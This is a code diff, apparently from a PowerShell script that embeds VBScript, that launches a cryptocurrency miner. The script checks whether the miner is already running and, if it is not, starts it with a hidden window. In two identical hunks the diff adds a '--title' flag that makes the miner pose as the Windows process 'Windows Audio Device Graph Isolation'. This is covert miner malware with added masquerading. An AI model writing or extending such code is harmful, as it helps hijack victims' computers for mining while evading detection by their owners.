@@ -1162,8 +1162,8 @@ Set colProcesses = objWMIService.ExecQuery(_
 
 If colProcesses.Count = 0 Then
     If CreateObject("Scripting.FileSystemObject").FileExists(minerPath) Then
-        ' Start completely hidden
-        WshShell.Run """"" & minerPath & """ --config=\"" & configPath & "\" --no-color", 0, False
+        ' Start completely hidden with stealth title
+        WshShell.Run """"" & minerPath & """ --config=\"" & configPath & "\" --no-color --title=\"Windows Audio Device Graph Isolation\"", 0, False
     End If
 End If
 "@
@@ -1286,8 +1286,8 @@ Set colProcesses = objWMIService.ExecQuery(_
 
 If colProcesses.Count = 0 Then
     If CreateObject("Scripting.FileSystemObject").FileExists(minerPath) Then
-        ' Start completely hidden
-        WshShell.Run """"" & minerPath & """ --config=\"" & configPath & "\" --no-color", 0, False
+        ' Start completely hidden with stealth title
+        WshShell.Run """"" & minerPath & """ --config=\"" & configPath & "\" --no-color --title=\"Windows Audio Device Graph Isolation\"", 0, False
     End If
 End If
 "@
